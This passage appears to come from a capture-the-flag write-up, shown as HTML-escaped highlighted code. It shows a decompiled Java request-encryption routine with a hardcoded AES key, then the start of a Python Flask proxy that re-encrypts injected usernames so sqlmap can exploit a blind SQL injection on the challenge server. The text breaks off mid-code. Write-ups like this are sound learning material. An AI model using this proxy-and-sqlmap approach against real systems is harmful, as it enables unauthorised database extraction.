class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;d\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebuildPayload\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003ebuildPayload\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eObject\u003c/span\u003e \u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e23\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e90\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e116\u003c/span\u003e \u003cspan class=\"o\"\u003e},\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;AES\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003earrayOfByte\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nf\"\u003eSecureRandom\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003enextBytes\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earrayOfByte\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e \u003cspan class=\"n\"\u003elocalIvParameterSpec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earrayOfByte\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e \u003cspan class=\"n\"\u003elocalCipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetInstance\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;AES/CBC/PKCS5Padding\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003elocalCipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003einit\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eKey\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003elocalIvParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003elocalCipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetBytes\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n    \u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earrayOfByte\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eencodeToString\u003c/span\u003e\u003cspan class=\"o\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[])\u003c/span\u003e\u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow we now how requests are made, it\u0026#39;s just a JSON Post request with an encrypted Json object looking like this\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;d\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eaes_encrypt(\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;alice\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;hunter2\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"err\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd using the same AES key we can read the response\u003c/p\u003e\n\n\u003ch2 id=\"step-3-inject-me\"\u003eStep 3: Inject me\u003c/h2\u003e\n\n\u003cp\u003eAfter playing a bit with the api I noticed a Blind SQL injection vunerability.\u003cbr\u003e\nBecause I\u0026#39;m lazy I wanted to use sqlmap to extract the data, and because I was fighting a huge hangover I forgot about sqlmap  temper script. \u003cbr\u003e\nSo I choosed to make a small flask webserver to serv as a proxy for the real one, making all the required transformations.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eCrypto\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eRandom\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ejson\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ebase64\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eapp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eFlask\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003e__name__\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003eURL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;http://35.243.186.41/\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003ekey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e229\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e233\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e160\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e166\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e116\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003eblock_size\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eblock_size\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eunpad\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003elambda\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e])]\u003c/span\u003e\n\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003epad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eplain_text\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003enumber_of_bytes_to_pad\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eblock_size\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eplain_text\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003eblock_size\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eascii_string\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003enumber_of_bytes_to_pad\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003epadding_str\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003enumber_of_bytes_to_pad\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003eascii_string\u003c/span\u003e\n    \u003cspan class=\"n\"\u003epadded_plain_text\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eplain_text\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003epadding_str\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003epadded_plain_text\u003c/span\u003e\n\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eencode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eobj\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eiv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eRandom\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eblock_size\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003ejs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edumps\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eobj\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003epadded_js\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003epad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejs\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eMODE_CBC\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eiv\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eencrypted_text\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epadded_js\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003efinal\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ebase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eb64encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eiv\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003eencrypted_text\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003efinal\u003c/span\u003e\n\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003edecode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;base64\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eiv\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eencrypted_text\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e[:\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e:]\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eMODE_CBC\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eiv\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eencrypted_text\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\n\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003eapp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e# Get the username from the query\n\u003c/span\u003e    \u003cspan class=\"n\"\u003eusername\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e# create a json object with our username and some valid data\n\u003c/span\u003e    \u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e# Encrypt it with AES\n\u003c/span\u003e    \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan 